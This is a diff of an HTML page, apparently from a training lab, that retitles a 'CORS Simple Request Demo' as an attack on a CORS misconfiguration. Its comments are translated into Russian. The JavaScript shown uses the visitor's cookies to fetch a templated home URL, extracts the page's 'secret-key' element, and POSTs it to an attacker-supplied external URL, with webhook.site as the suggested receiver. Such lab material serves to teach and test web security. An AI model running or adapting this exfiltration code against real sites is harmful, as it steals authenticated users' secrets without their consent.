@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Simple Request Demo</title>
+    <title>Атака на CORS misconfig</title>
 </head>
 <body>
-    <h1>CORS Simple Request Demo</h1>
+    <h1>Атака на CORS misconfig</h1>
 
     <label for="url">Enter URL to send data:</label>
-    <input type="text" id="url" placeholder="http://example.com/receive-data" style="width: 300px;">
+    <input type="text" id="url" placeholder="http://webhook.site" style="width: 300px;">
 
     <button id="sendRequest">Send Request</button>
 
@@ -20,19 +20,19 @@
 
         fetch('{{ home_url }}', {
             method: 'GET',
-            credentials: 'include' // Send cookies for authentication
+            credentials: 'include' // Прикладываем cookie к запросу
         })
         .then(response => response.text())
         .then(html => {
-            // Parsing the HTML response and extracting the secret key
+            //  Парсим страницу и достаем секретный ключ
             const parser = new DOMParser();
             const doc = parser.parseFromString(html, 'text/html');
             const secretKey = doc.getElementById('secret-key').textContent;
 
-            // Sending the extracted secret key to the user-specified URL
+            // Отправляем секретный ключ на внешний URL
             fetch(urlToSend, {
                 method: 'POST',
-                body: `secret=${encodeURIComponent(secretKey)}`, // Using application/x-www-form-urlencoded format
+                body: `secret=${encodeURIComponent(secretKey)}`,
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded'
                 }
@@ -52,19 +52,17 @@
 
         fetch('{{ home_url }}', {
             method: 'GET',
-            credentials: 'include' // Send cookies for authentication
+            credentials: 'include'
         })
         .then(response => response.text())
         .then(html => {
-            // Parsing the HTML response and extracting the secret key
             const parser = new DOMParser();
             const doc = parser.parseFromString(html, 'text/html');
             const secretKey = doc.getElementById('secret-key').textContent;
 
-            // Sending the extracted secret key to the user-specified URL
             fetch(urlToSend, {
                 method: 'POST',
-                body: `secret=${encodeURIComponent(secretKey)}`, // Using application/x-www-form-urlencoded format
+                body: `secret=${encodeURIComponent(secretKey)}`,
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded'
                 }
